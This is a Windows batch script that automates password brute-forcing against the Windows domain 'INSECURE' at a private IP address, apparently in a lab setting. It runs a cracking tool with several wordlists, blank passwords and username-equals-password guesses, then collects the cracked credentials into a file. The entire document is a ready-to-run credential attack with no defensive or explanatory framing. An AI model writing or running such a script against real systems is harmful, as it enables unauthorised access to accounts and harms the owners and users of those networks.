
@echo off 

:: set these variables first before running the script 

set "userlist=users.txt"
set target=192.168.80.50
set "domain=INSECURE"
set "passlist=pass100.txt"

:: password 
godance_386.exe -d %domain% -u %userlist% -w pass_password.txt -h %target% > godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


:: pass5.txt
godance_386.exe -d %domain% -u %userlist% -w pass5.txt -h %target% >> godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


:: user = pass
for /F "delims=" %%a in (%userlist%) do (
echo %%a> tempuser.txt
	 godance_386.exe -d %domain% -u tempuser.txt -w tempuser.txt -h %target% >> godance_brute_bat.txt
)
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


:: pass_blank.txt
godance_386.exe -d %domain% -u %userlist% -w pass_blank.txt -h %target% >> godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


:: pass10.txt
godance_386.exe -d %domain% -u %userlist% -w pass10.txt -h %target% >> godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


:: passlist
godance_386.exe -d %domain% -u %userlist% -w %passlist% -h %target% >> godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"


echo ""
echo ""
echo "################ FINISHED ################"
echo ""
type godance_brute_cracked_bat.txt